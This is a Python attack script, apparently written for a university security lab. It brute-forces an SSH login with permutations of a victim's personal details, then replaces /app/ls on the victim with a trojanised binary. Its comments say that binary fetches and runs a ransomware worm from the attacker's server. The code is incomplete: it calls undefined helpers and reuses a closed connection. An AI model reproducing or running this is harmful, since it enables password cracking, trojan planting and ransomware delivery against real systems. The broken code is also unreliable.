#!/usr/bin/python3
# ./crack_attack <Victim IP> <Attacker IP> <Attacker port> 
# ./crack_attack 172.18.0.3 172.18.0.2 22
import paramiko
import sys
import itertools

victim_ip = sys.argv[1]
attacker_ip = sys.argv[2]
attacker_port = sys.argv[3]

def read_victim_info():
    with open('/app/victim.dat') as f:
        return f.read().splitlines()

def ssh_login(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port, username, password)
        return True
    except paramiko.AuthenticationException:
        return False
    finally:
        client.close()


def main():
    # task1: crack ssh password
    # Cracking the victim’s password by launching a dictionary attack
    # username is csc2024
    victim_info = read_victim_info()
    # store all possible combinations of the victim's personal information first (dont login yet)
    possible_combinations = []
    for i in range(1, len(victim_info)+1):
        for permutation in itertools.permutations(victim_info, i):
            password = ''.join(permutation)
            possible_combinations.append(password)

    # try each combination to login
    Password = ""
    for password in possible_combinations:
        # print('Trying password:', password)
        if ssh_login(victim_ip, attacker_port, 'csc2024', password):
            Password = password
            print('Password found:', password)
            break

    # task2: Create a compression virus with the propagation of the  ransomware worm 
    if ssh_login(victim_ip, 22, 'csc2024', Password):
        print('Login successful')
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(victim_ip, 22, 'csc2024', Password)
        # Infect /app/ls in victim by embedding your compression virus
        # Infected ‘ls’ shall 
        # keep the same size as the original ‘ls’
        # The original ‘ls’ shall be compressed
        # contain the virus payload and the functionality of the original ‘ls’
        # finish the execution of the payload before the end of the ‘ls’ execution 
        # The virus payload shall 
        # fetch a ransomware worm from the attack server
        # execute the ransomware worm
        # Requirements
        # Including “0xaabbccdd” in the last 4 bytes of the infected ‘ls’ as your signature
        # You can check the last bytes of a file with xxd (xxd ls | tail -n 1)
        # HINTS:
        # Compressing ‘ls’ using zip
        # Minimizing the virus size with various methods
        # e.g., using /dev/tcp/host/port to build tcp connections, gcc flags and strip
        # Executing a program using the exec() family

        # copy ls from victim's usr/bin/ls to victim's /app/ls
        build_virus(attacker_ip, attacker_port, zip_ls())
        sftp = client.open_sftp()
        sftp.put('./fake_ls', '/app/ls')
        client.exec_command('chmod +x /app/ls')
        client.close()
        
        client.exec_command('cp /usr/bin/ls /app/ls')



        # close the connection
        client.close()
        
        # sftp = client.open_sftp()



if __name__ == '__main__':
    main()
